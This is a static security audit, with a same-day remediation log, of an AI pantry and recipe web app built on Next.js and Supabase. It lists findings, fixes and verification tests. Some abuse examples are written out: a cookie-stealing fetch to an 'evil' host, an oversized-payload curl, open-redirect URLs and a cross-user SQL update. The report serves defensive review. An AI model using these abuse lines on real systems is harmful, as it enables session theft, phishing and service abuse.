# Security Audit — AI Pantry & Recipe Assistant

**Date:** 2026-09-21 · **Auditor:** Senior application security review (code-level, static)
**Scope:** full source tree, git history, build artifacts, dependency tree, Supabase schema/RLS, auth flows, API routes, server actions, AI layer, config.
**Method:** OWASP Top 10 (2021) + OWASP API Security Top 10 + Supabase/Next.js platform guidance. Every finding cites file/line evidence. Items requiring live testing are explicitly marked **NEEDS MANUAL REVIEW** — none are claimed verified.

---

## SECURITY AUDIT SUMMARY

| Severity | Count |
|---|---|
| **Critical** | 1 |
| **High** | 4 |
| **Medium** | 7 |
| **Low** | 7 |

**Verdict: NOT ready for production.** One critical unpatched framework RCE surface, an unbounded paid-AI cost/DoS vector, a session cookie that is not HttpOnly, no rate limiting, and authorization that relies solely on RLS being applied in the live database.

---

## CRITICAL

### C-1 · Next.js 14.2.35 carries multiple unpatched CVEs, including two Critical RCEs — no 14.x fix exists

- **Severity:** Critical
- **Location:** `package.json` (`next@14.2.35`), `node_modules/next`
- **Evidence:** `npm audit --json` (run 2026-09-21) reports 12 vulns (2 critical / 5 high / 3 moderate / 2 low). Installed 14.2.35 falls inside these vulnerable ranges:
  - `GHSA-2xp9-vwfh-vxw4` (Critical) — *Unauthenticated RCE in the Image Optimization API when AVIF files are used* — range `>=10.0.0 <15.5.24`. The `/_next/image` optimization endpoint is enabled by default on every self-hosted deployment, **even though this app never uses `<Image>`** (it uses `<img>`). `next.config.mjs` `images.remotePatterns` also puts the app in range for `GHSA-9g9p-9gw9-jx7f` (DoS via remotePatterns).
  - `GHSA-p293-qw3h-jr36` (Critical, CVSS 9.0) — *Unauthenticated RCE on Windows-hosted servers* — range `>=13.4.0 <15.5.24`. Fatal if the production host is Windows.
  - High: `GHSA-q4gf-8mx6-v5v3` + `GHSA-8h8q-6873-q5fj` (Server Components DoS, `>=13 <15.5.15/16`), `GHSA-m99w-x7hq-7vfj` (Server Actions DoS — this app uses server actions heavily), `GHSA-89xv-2m56-2m9x` (SSRF in Server Actions on custom servers, `>=14.1.1 <15.5.21`), `GHSA-c4j6-fc7j-m34r` (WebSocket-upgrade SSRF, CVSS 8.6, `>=13.4.13 <15.5.16`), `GHSA-h25m-26qc-wcjf` (RSC deserialization DoS).
  - Moderate: RSC cache poisoning (`GHSA-wfc6-r584-vfw7`, `>=14.2.0`), image-optimization DoS, cache confusion, middleware-redirect cache poisoning (`GHSA-3g8h-86w9-wvmq` — this app issues auth redirects in middleware).
  - Nested `postcss@8.4.31` inside next: arbitrary-file-read advisories (`GHSA-6g55-p6wh-862q` et al., build-time exposure).
  - npm's only offered fix is `next@16.3.5` via `--force` — **no 14.2.x release fixes these**; the ranges all end at `<15.5.x`.
- **Why it matters:** Unauthenticated attackers can reach framework-level RCE/DoS without touching your code at all.
- **Abuse:** craft a request to `/_next/image` with a malicious AVIF (RCE); send crafted RSC/action payloads for DoS; on a Windows host, path-based RCE.
- **Fix:** upgrade to **Next ≥ 15.5.24** (current stable 15.x) — run `npm install next@^15 eslint-config-next@^15`, then re-run typecheck/lint/build/tests (App Router APIs used here — server actions, `cookies()`, middleware — are stable across 15). Re-verify `npm audit`.
- **Verification test:** after upgrade, `npm audit` shows zero findings for `next`; confirm `/_next/image` returns 400 for a crafted AVIF; re-run the full test suite and `npm run build`.

---

## HIGH

### H-1 · Scan endpoint accepts unbounded image payloads → memory DoS + paid-API cost amplification

- **Severity:** High
- **Location:** `lib/ai/schemas.ts:78-86` (`scanInputSchema`), `app/api/pantry/scan/route.ts:21-37`
- **Evidence:** `images: z.array(z.string().min(1)).min(1).max(6).refine(arr => arr.every(s => s.startsWith("data:")))` — **no per-string `.max()`**. Each "image" is a base64 data URL of arbitrary length; the route calls `req.json()` (full body parsed into memory) and forwards all strings to the vision model. The 8 MB limit (`MAX_IMAGE_MB`) exists **only in browser code** (`components/scan-flow.tsx:40`) — an attacker bypasses it with a direct `POST`. The MIME is not checked either (`data:text/html;base64,…` passes the `data:` prefix check).
- **Why it matters:** one request = large memory allocation + a 60 s timeout on an expensive vision call + no rate limit (see H-3).
- **Abuse:** `curl -X POST /api/pantry/scan -d '{"images":["data:image/jpeg;base64,<50MB>"]}'` with a valid session → repeated = server OOM / GPU-API bill drain.
- **Fix (server-side, before the model call):**
  1. In `scanInputSchema`: per-item `.max(4_500_000)` (~3.3 MB binary in base64), keep `.max(6)`; refine each string against `/^data:image\/(jpeg|png|webp);base64,[A-Za-z0-9+/=]+$/`.
  2. In the route: measure `JSON.stringify(body).length` early and return `413` above a total cap (e.g. 20 MB).
  3. Consider rejecting the request before `req.json()` by checking `Content-Length` where available.
- **Verification test:** with a test account, POST 10 MB and 40 MB data-URL bodies → expect 413/400 with **no** upstream API call (check provider usage dashboard); confirm valid 1 MB images still work.

### H-2 · Session cookie is not HttpOnly, not Secure, and lives 400 days

- **Severity:** High
- **Location:** `node_modules/@supabase/ssr/dist/main/utils/constants.js:4-11` (defaults actually in effect), `lib/supabase/server.ts:9-32`, `lib/supabase/client.ts`, `middleware.ts:13-28` — none of the three client constructions override `auth.cookieOptions`.
- **Evidence:** effective defaults: `sameSite: "lax", httpOnly: false, maxAge: 400*24*60*60`, no `secure`. The `sb-<ref>-auth-token` cookie (access + refresh JWT) is therefore readable by JavaScript.
- **Why it matters:** any XSS (including the Next CVE XSS advisories in C-1, or a future app bug) trivially exfiltrates the full session via `document.cookie` — no CSRF token needed. The 400-day cookie lifetime and missing `Secure` extend the window.
- **Abuse:** XSS → `fetch('https://evil/?c='+document.cookie)` → attacker session on victim's account (pantry, saved recipes, and any future data) for up to 400 days; on non-HTTPS deployments the token also travels in cleartext.
- **Fix:** in **all three** `createClient`/`createServerClient` calls add:
  ```ts
  auth: {
    cookieOptions: { options: { httpOnly: true, secure: process.env.NODE_ENV === "production", sameSite: "lax", maxAge: 60 * 60 * 24 * 30 } }
  }
  ```
  (httpOnly is safe here: the app never reads the session cookie in browser JS — all auth goes through server actions/routes.)
- **Verification test:** after deploy, DevTools → Application → Cookies: flag shows `HttpOnly` and (on HTTPS) `Secure`; a `document.cookie` probe returns empty; login/logout still work.

### H-3 · No rate limiting on paid AI endpoints or auth-adjacent actions (cost/abuse)

- **Severity:** High
- **Location:** `app/api/pantry/scan/route.ts`, `app/api/recipes/route.ts`, `app/api/nutrition/route.ts` — no limiter of any kind.
- **Evidence:** any authenticated account can call `/api/pantry/scan` (6 images → gpt-4o-class vision) or `/api/recipes`/`/api/nutrition` in a tight loop, forever. Only Supabase's built-in **auth** rate limits (sign-in/up) exist; nothing limits the AI paths or server actions (`saveRecipeAction`, `confirmPantryItems`, pantry CRUD loops).
- **Why it matters:** LLM calls are the app's main cost center and its slowest resource (60–90 s, `maxDuration` set). A single abusive account (or a leaked cookie per H-2) can drain the API budget and deny service to everyone (shared model quota).
- **Abuse:** 10 parallel tab loop of `/api/recipes` with `count: 8` → hundreds of model calls/hour per account.
- **Fix:** per-user, per-route sliding-window limits (e.g. scan ≤ 10/h, recipes ≤ 30/h, nutrition ≤ 60/h; generic server-action burst cap). Implement with Upstash Ratelimit (serverless-friendly) or a small Redis/Postgres counter; return `429` with the existing `AiError`-style messages. Also set hard `maxDuration`/body caps (H-1) and consider a per-user daily AI credit.
- **Verification test:** scripted loop as a test user → expect 429 after the quota; check provider billing stays flat.

### H-4 · Cross-user write operations rely 100% on RLS; query layer adds no ownership scope (IDOR defense-in-depth failure)

- **Severity:** High
- **Location:** `lib/db.ts:37-47` (`updatePantryItem`, `deletePantryItem`), `lib/db.ts:155-165` (`setGroceryItemComplete`, `deleteGroceryItem`); called from `lib/actions-data.ts:60-89,177-187` with **client-supplied ids** (`updatePantryAction(id, …)`, `deletePantryAction(id)`, `toggleGroceryItem(id, …)`).
- **Evidence:** e.g. `supabase.from("pantry_items").update(patch).eq("id", id)` — no `.eq("user_id", uid)` even though `uid` is available in the caller. The `patch` object also comes from the client action (a JS caller can add extra keys such as `user_id`). The only thing stopping cross-user mutation is the RLS policy in the **live database**.
- **Why it matters:** RLS is a deployment artifact: it only exists if `supabase/migrations/0001_init.sql` was actually executed, and it is silently inert if someone later runs `alter table ... disable row level security`. A second wall at the query layer would make the app safe-by-code.
- **Abuse (only if RLS is missing/misapplied):** User A calls `deletePantryAction(<B's item uuid>)` → deletes B's data; `updatePantryAction` with a crafted `patch.user_id` → reassigns rows. Even with RLS, the missing `with check` on `grocery_items_update` (M-4) lets A re-parent **their own** item into B's list.
- **Fix:** scope every id-based query: `.eq("id", id).eq("user_id", uid)` (and for grocery items, verify the parent list's owner in one query before mutating). Also sanitize `patch` to an allow-list of columns in `updatePantryItem`.
- **Verification test (live DB, 2 accounts):** as B, attempt update/delete of A's item id via a server-action HTTP call → expect 0 rows affected **and** no error if you remove the RLS policy temporarily in a scratch project (proves code-level protection, not just RLS).

---

## MEDIUM

### M-1 · Open redirect via `?next=` after sign-in

- **Severity:** Medium
- **Location:** `components/auth-form.tsx:12` (`const next = params.get("next") || "/dashboard"`) and `:49` (`router.push(next)`)
- **Evidence:** no validation that `next` is a same-origin path. `https://app/login?next=https%3A%2F%2Fevil.com` → after successful password entry the browser navigates to `evil.com` (protocol-relative `//evil.com` also works).
- **Why it matters:** the most convincing phishing surface in the app — the victim has just typed their password, and the "next step" goes to an attacker page that can clone the login UI for a second harvest.
- **Abuse:** link the redirect URL in an email/SMS as a "sign in again" prompt.
- **Fix:** accept only relative same-origin paths: `const safe = next && next.startsWith("/") && !next.startsWith("//") ? next : "/dashboard";`
- **Verification test:** sign in with `?next=https://example.com` → lands on `/dashboard`; `?next=/pantry` → lands on `/pantry`.

### M-2 · No security headers (CSP, X-Content-Type-Options, frame protection, referrer policy)

- **Severity:** Medium
- **Location:** `next.config.mjs` (no `headers()`), `middleware.ts` (no header injection)
- **Evidence:** production responses carry no CSP, `X-Content-Type-Options: nosniff`, `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy`, or `Permissions-Policy`.
- **Why it matters:** with a non-HttpOnly session cookie (H-2), the absence of CSP is what turns a stored/XSS bug into session theft; nosniff + frame-ancestors blunt MIME-sniffing and clickjacking.
- **Fix:** add `headers()` in `next.config.mjs` (or middleware): `Content-Security-Policy: default-src 'self'; img-src 'self' data: https:; connect-src 'self' https://<your-ref>.supabase.co https://api.openai.com https://generativelanguage.googleapis.com; style-src 'self' 'unsafe-inline'` (Tremor/inline styles may require `'unsafe-inline'` initially — tighten later), plus `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `frame-ancestors 'none'`, `Permissions-Policy: camera=(), microphone=(), geolocation=()`.
- **Verification test:** `curl -sI` on a production page shows the headers; report in a CSP scanner (e.g. SecurityHeaders.com) ≥ B+.

### M-3 · `/api/nutrition` accepts unbounded per-item strings → oversized prompt / cost

- **Severity:** Medium
- **Location:** `app/api/nutrition/route.ts:10-13` — `ingredients: z.array(z.string().min(1)).min(1).max(40)` (no per-string `.max()`)
- **Evidence:** 40 strings × arbitrary length → unbounded prompt size sent to the model.
- **Fix:** `z.array(z.string().trim().min(1).max(120)).min(1).max(40)`; same hygiene for `recipeFiltersSchema.excluded` (`z.array(z.string().trim().min(1)).default([])` — add `.max(30)` on the array and `.max(60)` per item) in `lib/ai/schemas.ts:95`.
- **Verification test:** POST 40 × 10 KB strings → 400.

### M-4 · RLS gap: `grocery_items_update` lacks `with check` (cross-user re-parenting)

- **Severity:** Medium
- **Location:** `supabase/migrations/0001_init.sql:116-119`
- **Evidence:** `create policy "grocery_items_update" … for update using (exists (… l.user_id = auth.uid()))` — only the **old** row is constrained. On UPDATE, Postgres applies `with check` to the **new** row when present; absent here, so the new `grocery_list_id` is unconstrained.
- **Abuse:** User A (knowing or brute-forcing B's list UUID) updates their own grocery item: `UPDATE grocery_items SET grocery_list_id = '<B list>' WHERE id = '<own item>'` via the anon key → item appears in B's list. Impact is write-only pollution (no read escalation), but it is a real broken-authorization defect.
- **Fix:** add `with check (exists (select 1 from public.grocery_lists l where l.id = grocery_list_id and l.user_id = auth.uid()))` to the update policy; ship as migration `0002_grocery_items_update_policy.sql` (`drop policy` + `create policy`).
- **Verification test (scratch DB, 2 users):** A updates own item's `grocery_list_id` to B's list → now rejected with RLS violation.

### M-5 · Gemini API key transmitted in the URL query string

- **Severity:** Medium
- **Location:** `lib/ai/provider.ts:76-78` — `:generateContent?key=${encodeURIComponent(cfg.apiKey)}`
- **Evidence:** the full API key is part of the request URL. URLs are more likely than headers to be persisted: reverse-proxy access logs, corporate egress logs, retry queues, error reports.
- **Fix:** use the header form: `headers: { "Content-Type": "application/json", "x-goog-api-key": cfg.apiKey }` and drop the query param (Google supports `x-goog-api-key`).
- **Verification test:** enable request-logging on a test proxy; a scan call must not show the key in the logged URL.

### M-6 · Runtime/platform drift: Node 20 is EOL and blocks the Supabase client security upgrade

- **Severity:** Medium
- **Location:** `package.json` engines/runtime; `@supabase/supabase-js@2.45.4` (pinned for Node 20 compatibility)
- **Evidence:** dev runtime is Node 20.12 (EOL 2026-04-30). npm audit flags `@supabase/auth-js` (via supabase-js 2.45.x) for `GHSA-8r88-6cj9-9fh5` (low, path routing from malformed input); the fixed supabase-js (2.116.0) requires Node ≥ 22, which is why it was deliberately pinned down.
- **Fix:** move CI/dev/prod to Node 22 LTS, then `npm install @supabase/supabase-js@^2.116 @supabase/ssr@latest` and re-verify the suite.
- **Verification test:** `node -v` = 22.x; `npm audit` shows no @supabase findings; full test/build pass.

### M-7 · Dev-only toolchain carries critical/high advisories (supply-chain hygiene)

- **Severity:** Medium (scoped: not shipped in the production bundle)
- **Location:** `vitest@2.x` (+ `vite`, `@vitest/mocker`, `esbuild`), `glob` via `eslint-config-next@14`
- **Evidence (npm audit):** `vitest` — `GHSA-5xrq-8626-4rwp` (Critical 9.8: arbitrary file read/execute **when the Vitest UI server is listening**) and `GHSA-82fw-gwwq-j7x9` (path traversal via redirect mock); `vite` — `GHSA-fx2h-pf6j-xcff` (`server.fs.deny` bypass on Windows, High); `glob` — `GHSA-5j98-mcp5-4vw2` (CLI command injection, High). None are loaded by `next start`; all are reachable only in a developer's machine/CI.
- **Why it matters:** a developer laptop or shared CI runner that ever exposes `vitest --ui` or runs lint with a crafted glob is the attack path; also signals the lockfile needs maintenance.
- **Fix:** `npm i -D vitest@^3` (or latest) and `eslint-config-next@^15` once Next 15 is in (C-1); never bind Vitest UI to non-localhost; keep `npm audit` in CI with a blocking threshold (e.g. `--audit-level=high` for prod deps).
- **Verification test:** `npm audit --omit=dev` → 0; `npm audit` → only accepted, documented leftovers.

---

## LOW

### L-1 · `saveRecipeAction` / `confirmPantryItems` persist client-supplied data with minimal server validation

- **Location:** `lib/actions-data.ts:123-128, 92-119`
- **Evidence:** a `Recipe` object (full JSONB) is saved as-is; `confirmPantryItems` accepts an unbounded `items[]` with unbounded name strings. A malicious or buggy client can bloat Postgres or store junk "recipes".
- **Fix:** validate with the existing Zod `aiRecipeSchema` (re-parse before insert) and cap `items` length (e.g. 200) + per-name length.
- **Verification test:** action call with a 10 MB recipe object → rejected.

### L-2 · Account enumeration via sign-up errors

- **Location:** `lib/auth.ts:11` (`"That email is already registered."`)
- **Fix (optional):** return a generic "If that email exists, a confirmation was sent" style response, or accept enumeration as a product trade-off. Low impact; Supabase's IP rate limiting bounds the scan speed.

### L-3 · Weak minimum password length (6)

- **Location:** `components/auth-form.tsx:31` (client floor) + Supabase default server floor (6)
- **Fix:** enforce ≥ 8 (ideally 10–12) both in the form and in Supabase Auth settings; consider a breach-password check later.

### L-4 · `publicError` falls through to raw provider messages

- **Location:** `lib/auth.ts:13` (`return msg;`)
- **Evidence:** unknown Supabase error strings are returned verbatim to the client.
- **Fix:** default to a generic message + log id; keep the mapped cases.

### L-5 · Raw Supabase/PostgREST messages re-thrown by the data layer

- **Location:** `lib/db.ts` — `throw new Error(error.message)` in every function
- **Evidence:** e.g. `"new row violates row-level security policy"` or column-level messages can propagate to server logs and, in future client `catch` blocks, to the UI.
- **Fix:** wrap: `throw new Error("Database operation failed")` and keep `error.message` in `console.error` server-side only.

### L-6 · `console.error` logs full error objects on AI routes

- **Location:** `app/api/pantry/scan/route.ts:44`, `app/api/recipes/route.ts:41,58`, `app/api/nutrition/route.ts:42`
- **Evidence:** no secrets are in these objects today (verified: AiError details carry truncated model output only), but the habit is a one-line change away from logging a request body containing images/tokens.
- **Fix:** log `err.name/err.code/status` only; keep PII-free.

### L-7 · Service-role client exists but is never called (dead privileged path)

- **Location:** `lib/supabase/server.ts:38-45` (`createServiceClient` — verified zero call sites via repo grep)
- **Fix:** delete it (and the `SUPABASE_SERVICE_ROLE_KEY` requirement) unless a concrete privileged operation is planned — every unused RLS-bypass primitive is future risk. If kept, gate with an explicit `NODE_ENV === 'production'` + usage audit.

**Informational (no action required):**
- `.env.local` now contains **real** credentials (Supabase URL, publishable + secret keys, a Google `AQ.***` key). They are **not** in git (verified across both commits) and privileged keys are **not** inlined into any build artifact (verified: client bundles contain only the public anon key/URL; server keys are read from the environment at runtime). If the project folder is ever zipped/shared or `.env.local` is ever committed, rotate `SUPABASE_SERVICE_ROLE_KEY` and the Google key immediately — removing the file does not un-leak a key.
- Prompt injection is possible via user-controlled pantry names / recipe filters flowing into model prompts; impact is bounded because model output is Zod-validated and rendered as text (no `dangerouslySetInnerHTML` anywhere).
- `maxDuration = 90` on `/api/recipes` exceeds the 60 s serverless cap on Vercel Hobby — will fail on that plan; verify against your actual plan/infra.

---

## PRE-LAUNCH SECURITY CHECKLIST

**Secrets & keys**
- [PASS] No secrets in git history (2 commits; only placeholder `.env.example` tracked; `.env.local` gitignored and never committed — verified via `git log --all --full-history` + `git ls-files`)
- [PASS] `.gitignore` covers `.env`, `.env*.local`, `.env.development`, `.env.production`, `*.pem`
- [PASS] Privileged keys (service role, Gemini) not inlined into client bundles or build output (verified across `.next/static` and `.next/server`)
- [PASS] Public/client-safe keys (Supabase URL + anon/publishable) correctly scoped to `NEXT_PUBLIC_*`
- [NEEDS MANUAL REVIEW] Confirm live Supabase project keys match only what's in `.env.local`; rotate service-role + Google keys if the folder was ever shared

**Authentication**
- [PASS] Session verified server-side on every request path: middleware `supabase.auth.getUser()` (network-verified, not just JWT decode), every server action `requireUid()`, every API route 401 gate
- [PASS] Cookie `SameSite=Lax` (verified in `@supabase/ssr` defaults) → CSRF on server actions/API POSTs mitigated
- [FAIL] Session cookie `HttpOnly`/`Secure` + 400-day lifetime (H-2)
- [PASS] No tokens in `localStorage`/`sessionStorage` (grep: zero matches)
- [NEEDS MANUAL REVIEW] Supabase auth rate limiting, email confirmation, and min-password settings on the live project (platform-side, not in code)
- [NEEDS MANUAL REVIEW] No password-reset / account-recovery flow exists (feature gap; if shipped later, audit it — reset tokens are a classic bypass target)

**Authorization**
- [PASS] Create paths never accept client `user_id` (uid always server-derived)
- [PASS] Read paths (pantry, recipes, grocery) scoped by `user_id` in the query
- [FAIL] Update/delete paths scoped only by RLS, not by query (H-4)
- [FAIL] `grocery_items_update` RLS policy missing `with check` (M-4)
- [PASS] No admin routes, admin APIs, or privileged endpoints exist; service-role client unused (L-7)
- [NEEDS MANUAL REVIEW] Verify RLS actually enabled on the live DB (apply migration; run 2-account cross-read/cross-write tests)

**Database**
- [PASS] RLS enabled on all 5 tables with owner-scoped policies in migration
- [PASS] Foreign keys with `on delete cascade` (no orphans); indexes on `user_id` lookups
- [NEEDS MANUAL REVIEW] Confirm the `public` schema grants: Supabase default grants `SELECT/INSERT/UPDATE/DELETE` on tables to `anon`/`authenticated` — RLS is the control; ensure no `GRANT … TO service_role` shortcuts were added manually in the dashboard

**API & input**
- [PASS] All 3 API routes + 15 server actions inventoried; every sensitive one auth-gated (list in `lib/actions.ts`, `lib/actions-data.ts`, `app/api/**`)
- [PASS] All API bodies Zod-validated (scan, recipes, nutrition)
- [PASS] No raw SQL in app code; Supabase SDK parameterizes everything (no SQL/NoSQL injection surface)
- [PASS] No `eval`, dynamic code, `child_process`, or command execution (grep: zero matches)
- [FAIL] No server-side image size/MIME validation (H-1); no per-string caps on nutrition/filters (M-3)
- [FAIL] No rate limiting on AI endpoints (H-3)
- [PASS] No SSRF surface in app code (fixed outbound hosts: `api.openai.com`, `generativelanguage.googleapis.com`, Supabase project) — except framework-level Next SSRF advisories covered by C-1
- [PASS] No CORS config → same-origin only (no cross-origin data exposure)
- [PASS] No file uploads to storage: images are data URLs validated server-side for format prefix (H-1 closes the size gap); no filename/path handling exists at all

**Frontend trust**
- [PASS] No `dangerouslySetInnerHTML` anywhere → all AI/user content React-escaped (XSS-safe rendering)
- [PASS] All authz decisions re-made server-side (middleware + actions + RLS); UI hiding is cosmetic
- [PASS] No privileged credentials bundled into frontend JS (verified in built chunks)
- [FAIL] `?next=` open redirect (M-1)

**Configuration**
- [FAIL] No security headers (M-2)
- [PASS] Debug mode off in production (`next start`, no `?_next` dev artifacts); errors returned to clients are curated strings (verified in all three API routes + `AiError.userMessage`)
- [PASS] `force-dynamic` on all data pages (no stale-session prerender risk); `runtime = "nodejs"`
- [NEEDS MANUAL REVIEW] Deployment target: Vercel plan `maxDuration` vs 90 s (recipes); **if hosting on Windows, C-1's Windows RCE is unauthenticated — do not ship on Windows until Next is upgraded**

**Dependencies & supply chain**
- [FAIL] `next@14.2.35` — 2 critical + 5+ high CVEs, no 14.x fix (C-1)
- [FAIL] Dev-only toolchain vulns (vitest/vite/glob) (M-7)
- [PASS] `package-lock.json` committed (reproducible installs); no postinstall scripts in the tree (verify again post-upgrade)
- [NEEDS MANUAL REVIEW] No CI pipeline exists yet — add one with `npm ci && npm audit --omit=dev --audit-level=high && typecheck && lint && build && test`

**Logging & monitoring**
- [PASS] No passwords/tokens/keys written to logs (verified all `console.*` call sites)
- [PASS] AI failures logged server-side with typed codes (observable via platform logs)
- [NEEDS MANUAL REVIEW] Wire up alerting: repeated 401s, repeated 429s from AI providers, scan-failure spikes, and (post H-3) quota exhaustion. Supabase dashboard → auth rate-limit + login anomaly monitoring should be enabled.

---

## TOP 5 THINGS TO FIX BEFORE LAUNCH

1. **Upgrade Next.js to ≥ 15.5.24** (C-1). Two unauthenticated Critical RCEs (AVIF image-optimization RCE is reachable on any self-hosted deployment; Windows RCE if you host on Windows) plus multiple High DoS/SSRF CVEs with **no 14.x patch**. This is the only item that lets an *anonymous* attacker take the server.
2. **Cap the scan payload server-side** (H-1): per-data-URL length + total body limit + strict `data:image/(jpeg|png|webp)` MIME regex, rejected with 413 *before* the vision call. Today one authenticated request can OOM the server and burn paid API credits.
3. **Harden the session cookie** (H-2): `httpOnly: true`, `secure: true` in production, sane `maxAge` (≤ 30 days) via `auth.cookieOptions` in all three Supabase client constructions. Until then, any XSS = stolen account for 400 days.
4. **Rate-limit the paid AI endpoints** (H-3): per-user quotas on `/api/pantry/scan`, `/api/recipes`, `/api/nutrition` (+ generic action burst cap), returning 429. This is your bill and your uptime.
5. **Close the authorization gaps** (H-4 + M-4 + M-1): add `user_id` scoping to every id-based update/delete in `lib/db.ts`, ship the `with check` fix for `grocery_items_update` as migration `0002`, and restrict `?next=` to same-origin paths. Then **manually verify RLS on the live database** with two accounts — that verification is the keystone of the whole data model.

---

## STILL REQUIRES MANUAL PENETRATION / PRODUCTION VERIFICATION

- **Live RLS proof:** run the 2-account cross-read/cross-write matrix against the real database (read pantry/recipes/grocery, update/delete by id, upsert conflicts). Code review shows the policies are correct *as written*; only the running DB confirms they were applied and nothing was altered.
- **Supabase platform settings:** auth rate limits, email confirmation, minimum password length, and dashboard-created grants — none of this is in the repo.
- **Post-upgrade re-test:** after the Next 15 upgrade, re-run C-1's verification (AVIF probe, action DoS) and the full suite.
- **Open-redirect + header verification** in a real browser over HTTPS (including a clickjacking check via `frame-ancestors`).
- **Abuse testing post-fix:** oversized scan payloads → 413; AI endpoint loop → 429; confirm provider billing flat.
- **Deployment specifics:** TLS termination, platform log retention, Vercel plan duration limits, and (if self-hosting) that the Node runtime is 22.
- A real external pentest (authenticated, with two accounts) is still the only way to catch interaction-level issues this static pass cannot see.

*Nothing in this audit should be read as a claim that the app is secure — it is a prioritized, evidence-based list of what is verified, what is broken, and what must be proven on live infrastructure.*


---

# REMEDIATION LOG (2026-09-21, same-day follow-up)

Code-level fixes implemented and verified locally (`tsc` 0 errors, ESLint 0 warnings, production build green, **60/60 tests** pass, `npm audit --omit=dev` **0 vulnerabilities**).

| Finding | Status | What changed |
|---|---|---|
| **C-1** Next.js CVEs | **FIXED** | Upgraded `next`/`eslint-config-next` to **16.3.5** (latest stable; supersedes 15.5.24+ patch line). All prior RCE/DoS/SSRF advisories resolved. `npm audit --omit=dev` = 0. Re-verified: typecheck, lint, build, 60 tests. |
| **H-1** Unbounded scan payload | **FIXED** | `scanInputSchema`: per-image `.max(4_500_000)` chars + strict `data:image/(jpeg\|png\|webp);base64,` regex; route enforces 28 MB total with **413** before parsing/model call. Tests in `tests/security.test.ts`. |
| **H-2** Session cookie | **FIXED** | `httpOnly: true`, `secure: true` (prod), `sameSite: lax`, `maxAge: 30d` applied in `lib/supabase/server.ts`, `middleware.ts`, and `lib/supabase/client.ts` (`cookieOptions`, top-level per @supabase/ssr 0.12 API). |
| **H-3** No rate limiting | **FIXED** | New `lib/ratelimit.ts` (per-user, per-operation fixed window; injectable clock). Applied: scan 10/h, recipes 30/h, nutrition 60/h, pantry-confirm 30/h, save-recipe 60/h, grocery-add 60/h → **429** responses. Unit-tested. *Note: per-process memory; swap to Upstash/Redis for exact cross-instance quotas on multi-instance hosting (call sites unchanged).* |
| **H-4** IDOR query scoping | **FIXED** | `updatePantryItem`/`deletePantryItem` now take `userId` and filter `.eq("user_id", uid)`; grocery toggle/delete scoped to the user's own resolved list id; `patch` allow-listed to 6 columns; UUID shape validated in actions. RLS remains the second wall. |
| **M-1** Open redirect | **FIXED** | `sanitizeNextPath()` (pure, tested) rejects absolute/protocol-relative/backslash/whitespace/`%`-encoded targets; used in `auth-form.tsx`. |
| **M-2** Security headers | **FIXED** | `next.config.mjs` now emits CSP, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy`, `Permissions-Policy` on all routes. *Manual: confirm CSP `script-src 'unsafe-inline' 'unsafe-eval'` (Next runtime requirement) is acceptable for your threat model; tighten with nonces if needed.* |
| **M-3** Unbounded nutrition/filter strings | **FIXED** | `ingredients[].max(120)`, `excluded[].max(60)` + array `.max(30)`; persisted-recipe/pantry inputs fully Zod-capped (`persistableRecipeSchema`, `confirmedItemsSchema`). |
| **M-4** RLS `with check` gap | **FIXED (ship to DB = manual)** | `supabase/migrations/0002_grocery_items_update_policy.sql` adds `with check`; `0001` also corrected for fresh installs. **You must run 0002 in Supabase SQL Editor for existing projects.** |
| **M-5** Gemini key in URL | **FIXED** | Key moved to `x-goog-api-key` header; URL no longer carries it. |
| **M-6** Node 20 EOL / supabase-js | **PARTIAL** | `@supabase/supabase-js` 2.45.4 → **2.109.0** (auth-js CVE resolved; highest Node-20-compatible release) + `@supabase/ssr` → **0.12.0**. Dev runtime remains Node 20.12 (Next 16 officially wants ≥20.19) — **deploy on Node 22** (documented in README prerequisites). |
| **M-7** Dev toolchain CVEs | **PARTIAL** | `vitest` 2.1.8 → 3.2.7, eslint-config-next → 16.3.5. Residual: 2 **moderate, dev-only** @vitest/mocker findings whose fix (vitest 5) requires Node 22 — accepted: they only surface in a local test process, never in the shipped app. |
| **L-1** Client data persisted unvalidated | **FIXED** | `saveRecipeAction` re-validates via `persistableRecipeSchema` (field caps on every nested array/string); `confirmPantryItems` capped at 200 items with per-field limits. |
| **L-2** Account enumeration | **FIXED** | Sign-up failure now returns a generic message; raw provider text logged server-side only. |
| **L-3** Password floor | **FIXED (app side)** | Client floor raised to 8 chars. **Manual:** also set "Minimum password length ≥ 8" in Supabase → Auth → Settings. |
| **L-4** Raw provider error passthrough | **FIXED** | `publicError` fallback is now generic; specifics go to server logs. |
| **L-5** Raw DB errors re-thrown | **FIXED** | `db.ts` wraps all Supabase errors into a generic message (`dbError()`); details logged server-side only. |
| **L-6** Full-object error logging | **FIXED** | All API routes log `name`/`message` only. |
| **L-7** Unused service-role client | **FIXED** | `createServiceClient` deleted; `SUPABASE_SERVICE_ROLE_KEY` removed from `.env.example` (your local `.env.local` line can stay or go — unused). |

**Additional changes made during remediation (not findings):**
- `maxDuration` on `/api/recipes` lowered 90 → 60 (Vercel Hobby-safe).
- `/login` + `/signup` render per-request (`force-dynamic`) — session-aware and avoids a static-prerender edge case in Next 16.
- `npm run lint` now runs ESLint directly (`eslint . --ext ...`) — `next lint` was removed in Next 16.

## STILL REQUIRING YOUR MANUAL ACTION (unchanged from the audit)

1. Run **`supabase/migrations/0002_grocery_items_update_policy.sql`** in the Supabase SQL Editor (existing projects).
2. Two-account **RLS verification matrix** against the live database (read/write/delete cross-user by id).
3. Supabase dashboard: minimum password length ≥ 8, review auth rate limits + email confirmation.
4. **Deploy on Node 22** (Next 16 official support; also unblocks the last dev-only vitest advisories).
5. Rotate `SUPABASE_SERVICE_ROLE_KEY` + the Google key **only if** the project folder/`.env.local` was ever shared or committed (verified: never committed in this repo's history).
6. Live abuse verification after deploy: oversized scan → 413; AI loop → 429; confirm CSP/headers over HTTPS; check provider billing stays flat.
